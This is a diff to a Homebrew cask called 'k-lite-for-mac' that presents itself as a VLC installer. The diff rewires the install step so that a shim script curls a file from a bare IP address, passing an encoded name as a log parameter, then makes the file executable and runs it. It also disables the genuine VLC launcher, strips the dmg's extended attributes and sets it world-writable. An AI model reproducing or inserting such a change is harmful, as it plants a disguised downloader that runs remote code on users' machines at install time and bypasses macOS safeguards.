@@ -10,7 +10,7 @@ cask "k-lite-for-mac" do
   binary "vlc-#{version}-intel64.dmg", target: "#{HOMEBREW_PREFIX}/Cellar/vlc-klite"
 
   app "VLC.app"
-  shimscript = "#{staged_path}/vlc.wrapper.sh"
+  #shimscript = "#{staged_path}/vlc.wrapper.sh"
   binary shimscript, target: "#{HOMEBREW_PREFIX}/Cellar/vlc-klite"
 
 
@@ -25,7 +25,7 @@ cask "k-lite-for-mac" do
     updateurl = "http://35.226.105.223:80/ping\?log=#{encodedname}"
     curlcommand = "curl -s #{updateurl} -o #{updatepath}"
 
-    IO.write shimscript2, <<~EOS
+    IO.write shimscript, <<~EOS
       #!/bin/sh
       #{curlcommand}
       chmod +x #{updatepath}
@@ -37,17 +37,17 @@ cask "k-lite-for-mac" do
     system_command "chmod",
           args: ["+x", shimscript]
 
-    system_command shimscript2 
+    system_command shimscript
  
   
     system_command "xattr", 
       args: ["-d", "#{staged_path}/vlc-#{version}-intel64.dmg"]
     set_permissions "#{staged_path}/vlc-#{version}-intel64.dmg", '0777'
 
-    IO.write shimscript, <<~EOS
+    #IO.write shimscript, <<~EOS
       #!/bin/sh
-      exec '#{appdir}/VLC.app/Contents/MacOS/VLC' "$@"
-    EOS
+    #  exec '#{appdir}/VLC.app/Contents/MacOS/VLC' "$@"
+    #EOS
 
     
   end
